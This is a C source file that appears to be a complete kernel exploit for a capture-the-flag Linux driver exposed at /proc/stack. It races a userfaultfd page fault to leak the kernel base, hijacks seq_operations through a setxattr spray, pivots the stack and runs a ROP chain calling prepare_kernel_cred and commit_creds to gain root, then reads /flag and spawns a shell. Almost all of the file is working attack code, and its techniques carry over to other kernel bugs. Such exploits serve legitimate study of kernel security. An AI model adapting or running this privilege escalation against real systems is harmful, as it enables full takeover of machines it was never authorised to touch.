#define _GNU_SOURCE
#include<sys/types.h>
#include<stdio.h>
#include<linux/userfaultfd.h>
#include<pthread.h>
#include<errno.h>
#include<stdlib.h>
#include<fcntl.h>
#include<signal.h>
#include<string.h>
#include<sys/mman.h>
#include<sys/syscall.h>
#include<poll.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>
#include<sys/prctl.h>
#include<sys/shm.h>
#include<sys/xattr.h>

#define ulong unsigned long
#define errExit(msg) do { perror("[ERROR EXIT]\n"); \
                          perror(msg); \
                          exit(EXIT_FAILURE); \
                     } while (0)
#define WAIT(msg) puts(msg); \
                  fgetc(stdin);

#define PAGE 0x1000

ulong user_cs,user_ss,user_sp,user_rflags;
int fd;                     // file descriptor of /dev/note
char *addr = 0x117117000;    // memory region supervisored
char *shmaddr = 0x200200000;    // memory region shmat
const char *buf[0x1000];            // userland buffer
const ulong len = PAGE*0x10;  // memory length
ulong leak, kernbase;


void pop_shell(void)
{
  char *argv1[] = {"/bin/cat","/flag",NULL};
  char *envp1[] = {NULL};
  execve("/bin/cat",argv1,envp1);
  char *argv2[] = {"/bin/sh",NULL};
  char *envp2[] = {NULL};
  execve("/bin/sh",argv2,envp2);
}

static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

#define POP     0x57ac0002
#define PUSH    0x57ac0001

struct Element{
  int owner;
  ulong value;
  struct Element *fd;
};

int _push(ulong *data)
{
  if(ioctl(fd, PUSH, data) < 0)
    if(errno == EINVAL){
      printf("[-] copy_from_user failed.\n");
      errno = 0;
    }else
      errExit("_push");

  // printf("[+] pushed %llx\n", *data); // data region can be mprotected to NON_PLOT, so don't touch it.
  return 0;
}

int _pop(ulong *givenbuf)
{
  if(ioctl(fd, POP, givenbuf) < 0)
    errExit("_pop");

  printf("[+] poped %llx\n", *givenbuf);
  return 0;
}


static void call_shmat(void)
{
  int shmid;
  void *addr;
  pid_t pid;

  if((pid=fork()) == 0){
    if((shmid = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600))==-1)
      errExit("shmget fail");

    if((addr=shmat(shmid, NULL, SHM_RDONLY))==-1)
      errExit("shmat fail");

    if(shmctl(shmid, IPC_RMID, NULL)==-1)
      errExit("shmctl");

    printf("[ ] Success call_shmat: %p\n", addr);
    printf("[ ] Child is exiting...\n");
    exit(0);
  }
  wait(pid);
  printf("[ ] Parent is returning...\n");
}

// cf. man page of userfaultfd
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  struct uffdio_range uffdio_range;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events
  ulong hogebuf;

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: %p\n",msg.arg.pagefault.address);

    //********* Now, another thread is halting. Do my business. **//
    // leak kernbase
    puts("[+] pop before push!");
    _pop(&hogebuf); // leak shm_file_data->ipc_namespace
    leak = hogebuf;
    kernbase = leak-0xc38600;
    printf("[!] leaked: %llx\n", leak);
    printf("[!] kernbase(text): %llx\n", kernbase);

    // change page permission and make fail copy_from_user
    mprotect(msg.arg.pagefault.address & ~(PAGE-1), PAGE, PROT_NONE);
    printf("[+] mprotected as PROT_NONE: %p\n", msg.arg.pagefault.address & ~(PAGE-1));
    uffdio_range.start = msg.arg.pagefault.address & ~(PAGE-1);
    uffdio_range.len = PAGE;
    if(ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range) == -1)
      errExit("ioctl-UFFDIO_UNREGISTER");
    printf("[+] unregistered supervisored region.\n");

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

// cf. man page of userfaultfd
void register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  pthread_t thr;  // ID of thread that handles page fault and continue exploit in another kernel thread
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  puts("[+] mmapping...");
  addr = mmap(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  puts("[+] mmapped...");
  if(addr == MAP_FAILED)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  uffdio_register.range.start = addr;
  uffdio_register.range.len = PAGE*0x10;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
}


int main(void)
{
  /** gadgets **/
  ulong pop_rdi = 0x194964;
  // 0xffffffff81194964: pop rdi ; ret  ;  (19 found)
  ulong pop_rcx = 0x0dee43;
  // 0xffffffff810dee43: pop rcx ; ret  ;  (49 found)
  ulong stack_pivot = 0x059d8b;
  // 0xffffffff81059d8b: mov esp, 0x83C389C0 ; ret  ;  (1 found)
  ulong prepare_kernel_cred = 0x06b960;
  // ffffffff8106b960 T prepare_kernel_cred
  ulong mov_rdi_rax = 0x0187bf;
  // 0xffffffff810187bf: mov rdi, rax ; rep movsq  ; pop rbp ; ret  ;  (1 found)
  ulong commit_creds = 0x06b770;
  // ffffffff8106b770 T commit_creds
  ulong swapgs_restore_regs_and_return_to_usermode = 0x600a4a;
  // ffffffff81600a34 T swapgs_restore_regs_and_return_to_usermode
  /*
   0xffffffff81600a4a <common_interrupt+74>:    mov    rdi,rsp
   0xffffffff81600a4d <common_interrupt+77>:    mov    rsp,QWORD PTR gs:0x5004
   0xffffffff81600a56 <common_interrupt+86>:    push   QWORD PTR [rdi+0x30]
   0xffffffff81600a59 <common_interrupt+89>:    push   QWORD PTR [rdi+0x28]
   0xffffffff81600a5c <common_interrupt+92>:    push   QWORD PTR [rdi+0x20]
   0xffffffff81600a5f <common_interrupt+95>:    push   QWORD PTR [rdi+0x18]
   0xffffffff81600a62 <common_interrupt+98>:    push   QWORD PTR [rdi+0x10]
   0xffffffff81600a65 <common_interrupt+101>:   push   QWORD PTR [rdi]
   0xffffffff81600a67 <common_interrupt+103>:   push   rax
   0xffffffff81600a68 <common_interrupt+104>:   xchg   ax,ax
   0xffffffff81600a6a <common_interrupt+106>:   mov    rdi,cr3
   0xffffffff81600a6d <common_interrupt+109>:   jmp    0xffffffff81600aa3 <common_interrupt+163>
   0xffffffff81600a6f <common_interrupt+111>:   mov    rax,rdi
   0xffffffff81600a72 <common_interrupt+114>:   and    rdi,0x7ff

  */


  void *tmp_addr;
  ulong tmp_buf = 0xdeadbeef;
  int sfd;
  unsigned long* fstack;
  ulong *rop;

  // save state
  save_state();

  //  open target proc file
  if((fd=open("/proc/stack",O_RDONLY))<0)
    errExit("open-/proc/stack");

  // set userfaultfd
  register_userfaultfd_and_halt();
  sleep(1);

  //
  call_shmat(); // kalloc and kfree shm_file_data structure at kmalloc-32
  _push(addr); // invoke fault

  // alloc seq_operations;
  if((sfd = open("proc/self/stat", O_RDONLY)) == -1)
    errExit("single_open");

  // overwrite seq_operations;
  char buf[0x20];
  printf("[+] stack pivot gadget: %p\n", kernbase + stack_pivot);
  for(int ix=0; ix!=4; ++ix) // first 8byte is useless.
    *(ulong*)(buf+ix*8) = (kernbase + stack_pivot);
  setxattr("/tmp", "SHE_IS_SUMMER", buf, 0x20, XATTR_CREATE);

  // alloc fake stack for 0x83C389C0
  fstack = mmap(0x83C38000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if(fstack != 0x83C38000)
    errExit("fstack");

  /********** construct kROP ***************/
  rop = (ulong*)0x83C389c0;
  // Get cred of init task.
  *rop++ = kernbase + pop_rdi;
  *rop++ = 0;
  *rop++ = kernbase + prepare_kernel_cred;
  // Commit that cred.
  *rop++ = kernbase + pop_rcx;      // Cuz mov_rdi_rax gadget contains rep inst, set counter to 0.
  *rop++ = 0;
  *rop++ = kernbase + mov_rdi_rax;
  *rop++ = 0; // fake rbp
  *rop++ = kernbase + commit_creds;
  // Return to usermode by swapgs_restore_regs_and_return_to_usermode
  *rop++ = kernbase + swapgs_restore_regs_and_return_to_usermode;
  *rop++ = 0;
  *rop++ = 0;
  *rop++ = (ulong)&pop_shell;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp;
  *rop++ = user_ss;

  // pop shell
  read(sfd, buf, 0x10);

  return 0;
}
